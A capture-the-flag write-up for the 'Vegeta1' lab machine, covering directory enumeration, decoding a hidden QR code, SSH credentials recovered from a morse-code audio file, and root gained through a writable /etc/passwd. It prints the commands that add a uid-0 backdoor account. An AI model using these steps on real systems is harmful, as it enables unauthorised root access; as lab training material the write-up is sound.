# Vegeta1
### Enumeration
Port 22 and 80 are open. Running Feroxbuster:

```
301      GET        9l       28w      312c http://192.168.51.73/img => http://192.168.51.73/img/
200      GET        0l        0w        0c http://192.168.51.73/login.php
301      GET        9l       28w      314c http://192.168.51.73/image => http://192.168.51.73/image/
301      GET        9l       28w      314c http://192.168.51.73/admin => http://192.168.51.73/admin/
200      GET        1l        2w        9c http://192.168.51.73/admin/admin.php
403      GET        9l       28w      278c http://192.168.51.73/server-status
```

We can see `login.php` is an empty file, and `admin.php` has the contents `<?php ?>`.

Checking `/robots.txt`, we see `/find_me`. Visiting that path, we see a single file `find_me.html`. When we open it it, the only visible contents are `Vegeta-1.0`. But the file size was much too large for this to be the only content (it was 3.8 KB).

Turns out that there's an HTML comment at the bottom of the page containing a twice base64-encoded PNG file. Decoding and opening (`base64 -d find_me.html | base64 -d > outfile.png`), we get a QR code.

We can scan the QR code using `zbarimg outfile.png`. The encoded content is `Password : topshellv`.

Turns out this password isn't useful for anything.

### Foothold

Using feroxbuster, we find the directory `/bulma` which contains an audio file. The contents is morse code which when decoded gives the credentials `trunks` and `u$3r`. When we attempt to SSH as the `trunks` user with `u$3r` as the password, we get a shell.

### Privilege Escalation
Running linpeas, we discover that `/etc/passwd` is writable. Following the instructions on [hacktricks](https://book.hacktricks.xyz/linux-unix/privilege-escalation#passwd-shadow-files), we generate a hashed password:

```
openssl passwd -1 -salt hacker hacker
```

Then we add the following line to `/etc/passwd`:

```
hacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash
```

Now we can run:

```
su - hacker
> Password: hacker
```

And we have a root shell.